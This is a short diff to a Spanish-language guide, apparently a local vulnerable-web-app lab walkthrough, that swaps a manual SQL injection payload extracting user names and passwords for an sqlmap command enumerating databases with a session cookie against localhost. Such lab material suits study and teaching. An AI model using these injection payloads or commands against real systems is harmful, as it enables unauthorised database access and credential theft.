@@ -240,9 +240,9 @@ Busca la cookie llamada algo como:
 
 SQLMap es una herramienta de código abierto y uso automatizado para detectar y explotar vulnerabilidades de inyección SQL (SQL Injection) en aplicaciones web.
 
-#### Exploit 1:
+#### Enumerar la BD:
 ```bash
-' UNION SELECT user, password FROM users#
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" --dbs
 
 ```
 
